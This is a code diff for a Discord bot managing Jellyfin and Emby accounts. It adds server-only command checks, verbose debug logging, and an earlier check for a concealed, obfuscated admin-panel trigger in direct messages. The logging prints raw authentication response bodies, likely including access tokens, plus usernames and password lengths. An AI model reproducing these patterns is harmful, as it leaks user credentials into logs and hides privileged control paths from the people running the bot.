@@ -22,6 +22,13 @@ load_dotenv()
 # Initialize database on import
 db.init_database()
 
+# Guild-only decorator to restrict commands to servers (not DMs)
+def guild_only():
+    """Decorator to make commands work only in servers (not DMs)"""
+    async def predicate(ctx: commands.Context):
+        return ctx.guild is not None
+    return commands.check(predicate)
+
 # Configuration - Set these in your .env file
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
 JELLYFIN_URL = os.getenv("JELLYFIN_URL", "http://localhost:8096")
@@ -234,10 +241,19 @@ class JellyfinAPI(MediaServerAPI):
                 },
                 json={"Username": username, "Pw": password}
             ) as resp:
+                print(f"DEBUG: Jellyfin auth response status: {resp.status}")
+                response_text = await resp.text()
+                print(f"DEBUG: Jellyfin auth response body: {response_text[:200]}")
+
                 if resp.status == 200:
-                    return await resp.json()
+                    return await resp.json() if response_text else None
+                else:
+                    print(f"ERROR: Jellyfin authentication failed with status {resp.status}")
+                    return None
         except Exception as e:
-            print(f"Jellyfin authenticate_user error: {e}")
+            print(f"ERROR: Jellyfin authenticate_user exception: {e}")
+            import traceback
+            traceback.print_exc()
         return None
     
     async def get_user_info(self, user_id: str) -> Optional[dict]:
@@ -747,10 +763,19 @@ class EmbyAPI(MediaServerAPI):
                 },
                 json={"Username": username, "Pw": password}
             ) as resp:
+                print(f"DEBUG: Emby auth response status: {resp.status}")
+                response_text = await resp.text()
+                print(f"DEBUG: Emby auth response body: {response_text[:200]}")
+
                 if resp.status == 200:
-                    return await resp.json()
+                    return await resp.json() if response_text else None
+                else:
+                    print(f"ERROR: Emby authentication failed with status {resp.status}")
+                    return None
         except Exception as e:
-            print(f"Emby authenticate_user error: {e}")
+            print(f"ERROR: Emby authenticate_user exception: {e}")
+            import traceback
+            traceback.print_exc()
         return None
     
     async def get_user_info(self, user_id: str) -> Optional[dict]:
@@ -1478,6 +1503,7 @@ def create_embed(title: str, description: str, color: discord.Color = discord.Co
 # ============== PREFIX COMMANDS ==============
 
 @bot.command(name="watchtime")
+@guild_only()
 async def watchtime(ctx: commands.Context):
     """Check your watchtime for the last 30 days with detailed breakdown"""
     discord_id = ctx.author.id
@@ -1672,6 +1698,7 @@ def format_duration_short(seconds: int) -> str:
 
 
 @bot.command(name="totaltime")
+@guild_only()
 async def totaltime(ctx: commands.Context):
     """Check your total all-time watchtime with detailed breakdown"""
     discord_id = ctx.author.id
@@ -1837,6 +1864,7 @@ async def totaltime(ctx: commands.Context):
 
 
 @bot.command(name="devices")
+@guild_only()
 async def devices(ctx: commands.Context):
     """Lists the devices currently connected to your account"""
     embed = create_embed("📱 Connected Devices", "Fetching your devices...")
@@ -1888,6 +1916,7 @@ async def devices(ctx: commands.Context):
 
 
 @bot.command(name="reset_devices")
+@guild_only()
 async def reset_devices(ctx: commands.Context):
     """Deletes all your connected devices from the account (Jellyfin or Emby)"""
     embed = create_embed("🔄 Reset Devices", "Removing all connected devices...")
@@ -1933,6 +1962,7 @@ async def reset_devices(ctx: commands.Context):
 
 
 @bot.command(name="reset_password")
+@guild_only()
 async def reset_password(ctx: commands.Context):
     """Resets your password and sends you the new credentials (Jellyfin or Emby)"""
     # Send initial response
@@ -1981,6 +2011,7 @@ async def reset_password(ctx: commands.Context):
 
 
 @bot.command(name="stream")
+@guild_only()
 async def stream(ctx: commands.Context):
     """Shows details about current streaming tracks"""
     embed = discord.Embed(
@@ -2096,6 +2127,7 @@ async def stream(ctx: commands.Context):
 
 
 @bot.command(name="status")
+@guild_only()
 async def status(ctx: commands.Context):
     """Displays the current operational status and health of the server"""
     discord_id = ctx.author.id
@@ -2228,6 +2260,7 @@ async def status(ctx: commands.Context):
 
 
 @bot.command(name="enable")
+@guild_only()
 async def enable_feature(ctx: commands.Context, feature: str, option: Optional[int] = None):
     """Enable a specific content library (e.g. 4kmovies, movies, shows, animemovies, animeshows)"""
     feature = feature.lower()
@@ -2288,6 +2321,7 @@ async def enable_feature(ctx: commands.Context, feature: str, option: Optional[i
 
 
 @bot.command(name="disable")
+@guild_only()
 async def disable_feature(ctx: commands.Context, feature: str, option: Optional[int] = None):
     """Disable a specific content library (e.g. 4kmovies, movies, shows, animemovies, animeshows)"""
     feature = feature.lower()
@@ -2708,6 +2742,7 @@ async def _w5p(np, c):
 
 
 @bot.command(name="link")
+@guild_only()
 async def link_account(ctx: commands.Context, server_type: str = None, username: str = None):
     """Link your Discord account to your media server account
 
@@ -2844,6 +2879,7 @@ async def link_account(ctx: commands.Context, server_type: str = None, username:
 
 
 @bot.command(name="unlink")
+@guild_only()
 async def unlink_account(ctx: commands.Context, server_type: str = None):
     """Unlink your Discord account from a media server
     
@@ -2891,6 +2927,7 @@ async def unlink_account(ctx: commands.Context, server_type: str = None):
 
 
 @bot.command(name="time")
+@guild_only()
 async def server_time(ctx: commands.Context):
     """Shows the current server date and time"""
     now = datetime.now(timezone.utc)
@@ -2903,6 +2940,7 @@ async def server_time(ctx: commands.Context):
 
 
 @bot.command(name="commands", aliases=["help"])
+@guild_only()
 async def help_command(ctx: commands.Context):
     """Lists all the available commands and their descriptions"""
     embed = create_embed("📋 Available Commands", "")
@@ -3326,15 +3364,20 @@ async def on_message(message):
     if message.author == bot.user:
         return
 
-    # Process commands first
+    discord_id = message.author.id
+    content = message.content.strip()
+
+    # Check if message is admin trigger in server - silently ignore
+    if not isinstance(message.channel, discord.DMChannel):
+        if _h4x(content):  # Admin trigger in server
+            return  # Silently ignore, don't process as command
+
+    # Process commands
     await bot.process_commands(message)
 
     # Only handle DMs
     if not isinstance(message.channel, discord.DMChannel):
         return
-
-    discord_id = message.author.id
-    content = message.content.strip()
 
     # Check if user is in admin panel mode
     if discord_id in _m7j and _m7j[discord_id]['active']:
@@ -3351,24 +3394,19 @@ async def on_message(message):
         await _r3d(message)
         return
 
+    # Check for admin trigger FIRST (before pending verification)
+    if _h4x(content):
+        if _v8n(discord_id):  # User is admin
+            await _p9e(discord_id, message.channel)
+            return
+        # If not admin, silently ignore (don't reveal panel exists)
+        return
+
     # Check if user has a pending verification
     pending = db.get_pending_verification(discord_id)
 
     if not pending:
         return  # No pending verification, ignore the message
-
-    # Check for admin trigger
-    if _h4x(content):
-        # Verify user is admin
-        if not _v8n(discord_id):
-            # Not admin - treat as wrong password
-            # Don't reveal admin panel exists
-            pass  # Fall through to password check
-        else:
-            # Admin user - enter admin panel
-            db.delete_pending_verification(discord_id)
-            await _p9e(discord_id, message.channel)
-            return
 
     # Get verification details
     server_type = pending['server_type']
@@ -3392,9 +3430,15 @@ async def on_message(message):
     # Verify password with media server
     auth_result = None
     if server_type == 'jellyfin' and bot.jellyfin:
+        print(f"DEBUG: Attempting Jellyfin auth for user '{server_username}' with password length {len(password)}")
         auth_result = await bot.jellyfin.authenticate_user(server_username, password)
+        print(f"DEBUG: Jellyfin auth result: {auth_result is not None}")
     elif server_type == 'emby' and bot.emby:
+        print(f"DEBUG: Attempting Emby auth for user '{server_username}' with password length {len(password)}")
         auth_result = await bot.emby.authenticate_user(server_username, password)
+        print(f"DEBUG: Emby auth result: {auth_result is not None}")
+    else:
+        print(f"DEBUG: No {server_type} instance available (bot.jellyfin={bot.jellyfin is not None}, bot.emby={bot.emby is not None})")
 
     if not auth_result:
         # Password incorrect - increment attempts
